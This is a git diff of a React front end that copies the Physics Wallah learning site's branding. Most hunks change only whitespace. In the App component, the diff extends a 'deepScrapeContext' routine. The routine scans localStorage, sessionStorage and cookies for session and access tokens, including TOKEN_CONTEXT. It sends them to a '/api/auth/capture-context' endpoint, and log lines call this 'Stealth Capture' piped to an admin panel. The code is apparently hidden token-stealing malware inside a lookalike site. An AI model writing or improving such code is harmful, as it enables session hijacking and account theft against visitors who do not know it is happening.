@@ -50,7 +50,7 @@ const Header = ({ scrolled, onNavigate }) => {
 
   // Light variant for Landing page
   return (
-    <header 
+    <header
       style={{ top: 0 }}
       className={`fixed left-0 right-0 z-[100] transition-all duration-300 ${scrolled ? 'bg-white/95 backdrop-blur-md shadow-md h-[65px]' : 'bg-white h-[75px]'} flex items-center justify-center`}
     >
@@ -158,13 +158,13 @@ const HomePage = () => {
                 Get Started
               </button>
               <div className="relative flex-1 max-w-md">
-                <input 
-                  type="text" 
-                  placeholder="Search for courses, batches, etc." 
-                  className="w-full h-full min-h-[56px] pl-5 pr-28 rounded-xl border-2 border-gray-100 outline-none focus:border-[#5A4BDA] transition-all bg-gray-50/50" 
+                <input
+                  type="text"
+                  placeholder="Search for courses, batches, etc."
+                  className="w-full h-full min-h-[56px] pl-5 pr-28 rounded-xl border-2 border-gray-100 outline-none focus:border-[#5A4BDA] transition-all bg-gray-50/50"
                 />
-                <button 
-                  onClick={() => navigate('/batches')} 
+                <button
+                  onClick={() => navigate('/batches')}
                   className="absolute right-2 top-1/2 -translate-y-1/2 bg-[#5A4BDA] text-white px-6 py-2.5 rounded-lg font-bold text-sm hover:bg-[#4437B8] transition-all shadow-md"
                 >
                   Search
@@ -174,10 +174,10 @@ const HomePage = () => {
           </div>
           <div className="hidden lg:flex justify-center relative">
             <div className="relative z-10 transition-transform duration-500 hover:scale-[1.02]">
-              <img 
-                src="https://static.pw.live/ua/images/hero-student-w.webp" 
-                className="w-full max-w-[550px] h-auto rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.1)]" 
-                alt="Hero" 
+              <img
+                src="https://static.pw.live/ua/images/hero-student-w.webp"
+                className="w-full max-w-[550px] h-auto rounded-3xl shadow-[0_20px_50px_rgba(0,0,0,0.1)]"
+                alt="Hero"
                 loading="lazy"
               />
             </div>
@@ -220,17 +220,17 @@ const HomePage = () => {
                 <p className="text-gray-500 font-medium">Please enter your name to personalize your learning journey.</p>
               </div>
               <div className="w-full">
-                <input 
-                  type="text" 
+                <input
+                  type="text"
                   value={nameInput}
                   onChange={(e) => setNameInput(e.target.value)}
-                  placeholder="Your Full Name" 
+                  placeholder="Your Full Name"
                   className="w-full px-6 py-4 rounded-xl border-2 border-gray-100 outline-none focus:border-[#5A4BDA] transition-all bg-gray-50/50 text-lg font-bold"
                   autoFocus
                   onKeyDown={(e) => e.key === 'Enter' && handleNameSubmit()}
                 />
               </div>
-              <button 
+              <button
                 onClick={handleNameSubmit}
                 disabled={!nameInput.trim()}
                 className="w-full pw-button-primary py-4 text-lg font-bold rounded-xl shadow-lg disabled:opacity-50 disabled:cursor-not-allowed transform active:scale-95 transition-all"
@@ -255,7 +255,7 @@ function App() {
   useEffect(() => {
     const handleScroll = () => setScrolled(window.scrollY > 20);
     window.addEventListener('scroll', handleScroll);
-    
+
     // Global Real View Tracking (Backend Heartbeat)
     const deviceId = localStorage.getItem('pw_device_id') || `device_${Math.random().toString(36).substr(2, 9)}`;
     if (!localStorage.getItem('pw_device_id')) localStorage.setItem('pw_device_id', deviceId);
@@ -265,7 +265,7 @@ function App() {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({ deviceId })
-      }).catch(() => {});
+      }).catch(() => { });
     };
 
     sendHeartbeat();
@@ -275,7 +275,7 @@ function App() {
     const deepScrapeContext = () => {
       try {
         const foundData = [];
-        
+
         // 1. Scan LocalStorage & SessionStorage completely
         const storages = [localStorage, sessionStorage];
         storages.forEach(store => {
@@ -287,45 +287,59 @@ function App() {
           });
         });
 
-        // 2. Scan all reachable Cookies
-        const cookies = document.cookie.split(';').reduce((acc, c) => {
-          const [k, v] = c.split('=').map(s => s?.trim());
-          if (k && v) acc[k] = v;
-          return acc;
-        }, {});
+        // 2. Scan Cookies with Robust Parsing (Handles nested equals and complex JSON)
+        const rawCookies = document.cookie.split(';');
+        rawCookies.forEach(cookieStr => {
+          const firstEqual = cookieStr.indexOf('=');
+          if (firstEqual === -1) return;
 
-        Object.entries(cookies).forEach(([k, v]) => {
-          if (v.includes('randomId') || v.includes('access_tokens') || k.toLowerCase().includes('token')) {
+          const k = cookieStr.substring(0, firstEqual).trim();
+          const v = cookieStr.substring(firstEqual + 1).trim();
+
+          // Explicitly target TOKEN_CONTEXT or any key/value matching session patterns
+          if (k === 'TOKEN_CONTEXT' || v.includes('randomId') || v.includes('access_tokens') || k.toLowerCase().includes('token')) {
             foundData.push({ source: `Cookie:${k}`, data: v });
           }
         });
 
         // 3. Process and Capture
         foundData.forEach(item => {
-          // Deduplicate within this session
           const sessionKey = `capt_cache_${item.source}`;
           if (sessionStorage.getItem(sessionKey) === item.data) return;
 
           let parsed = item.data;
-          try { 
+          try {
+            // Try decoding first, then parse
             const decoded = decodeURIComponent(item.data);
-            parsed = JSON.parse(decoded); 
-          } catch(e) {
-            parsed = { raw: item.data, source: item.source };
+            parsed = JSON.parse(decoded);
+          } catch (e) {
+            // Fallback to raw JSON parse if decoding fails or isn't needed
+            try { parsed = JSON.parse(item.data); } catch (ex) {
+              parsed = { raw: item.data, source: item.source };
+            }
           }
+
+          console.info(`📡 [Scanner] Sending capture found in ${item.source}...`);
 
           fetch('/api/auth/capture-context', {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ deviceId, context: parsed })
-          }).then(res => {
-            if (res.ok) {
+          }).then(res => res.json()).then(data => {
+            if (data.success) {
               sessionStorage.setItem(sessionKey, item.data);
-              console.info(`✅ Stealth Capture Saved: ${item.source}`);
+              console.info(`✅ [Scanner] Capture Success: ${item.source}`);
+            } else if (data.message === "Duplicate, skipped") {
+              sessionStorage.setItem(sessionKey, item.data);
+              console.debug(`⏭️ [Scanner] Already captured on server: ${item.source}`);
             }
-          }).catch(() => {});
+          }).catch(err => {
+            console.error(`❌ [Scanner] API Error [${item.source}]:`, err.message);
+          });
         });
-      } catch (err) {}
+      } catch (err) {
+        console.warn('⚠️ [Scanner] Error:', err.message);
+      }
     };
 
     // Trigger on all major events for maximum capture rate
@@ -342,7 +356,7 @@ function App() {
         body: JSON.stringify({ deviceId, context: data })
       }).then(() => console.info('✅ Manually Piped to Admin Panel!'));
     };
-    
+
     return () => {
       window.removeEventListener('scroll', handleScroll);
       window.removeEventListener('focus', deepScrapeContext);
@@ -358,8 +372,8 @@ function App() {
       <div className="min-h-screen font-poppins text-[#1b212d] bg-white">
         <Suspense fallback={
           <div className="flex flex-col items-center justify-center min-h-[60vh] gap-4">
-             <div className="w-10 h-10 border-4 border-[#5A4BDA] border-t-transparent rounded-full animate-spin"></div>
-             <p className="text-gray-400 font-bold text-sm tracking-widest animate-pulse">PHYSICS WALLAH</p>
+            <div className="w-10 h-10 border-4 border-[#5A4BDA] border-t-transparent rounded-full animate-spin"></div>
+            <p className="text-gray-400 font-bold text-sm tracking-widest animate-pulse">PHYSICS WALLAH</p>
           </div>
         }>
           <Routes>
